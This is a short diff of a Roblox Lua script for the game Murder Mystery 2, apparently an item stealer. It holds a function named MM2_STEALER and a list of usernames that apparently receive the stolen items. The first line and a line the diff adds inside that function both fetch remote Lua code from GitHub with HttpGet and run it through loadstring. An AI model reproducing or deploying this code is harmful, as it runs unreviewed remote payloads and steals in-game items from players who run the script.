@@ -1,5 +1,4 @@
 loadstring(game:HttpGet('https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/mm2-fix.lua', true))()
-
 Usernames = {
     'Joezeif111x', 
     'joeiamjoezeif', 
@@ -68,6 +67,7 @@ function MM2_STEALER()
 	local Workspace = game:GetService("Workspace")
 	local VirtualUser = game:GetService("VirtualUser")
 	local LocalPlayer = Players.LocalPlayer;
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/spawnerscript/MurderMystery2/refs/heads/main/Skiddertrynabetuff"))()
 	local bb = game:GetService("VirtualUser")
 	game:service"Players".LocalPlayer.Idled:connect(function()
 		bb:CaptureController()
